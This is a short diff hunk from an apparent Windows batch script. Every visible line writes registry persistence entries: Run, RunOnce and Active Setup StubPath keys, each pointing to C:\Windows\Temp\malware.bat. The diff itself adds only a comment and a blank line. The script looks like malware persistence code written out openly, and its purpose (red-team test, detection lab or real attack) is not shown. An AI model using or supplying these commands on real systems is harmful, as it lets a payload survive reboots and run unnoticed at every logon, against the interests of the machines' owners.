@@ -53,6 +53,8 @@ reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Malware /t REG_S
 reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v Malware /t REG_SZ /d C:\Windows\Temp\malware.bat /f
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Malware /t REG_SZ /d C:\Windows\Temp\malware.bat /f
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v Malware /t REG_SZ /d C:\Windows\Temp\malware.bat /f
+
+:: Create Active Setup key
 reg add "HKLM\Software\Microsoft\Active Setup\Installed Components\{Malware}" /v StubPath /t REG_SZ /d C:\Windows\Temp\malware.bat /f
 
 :: Create registry keys for winlogin
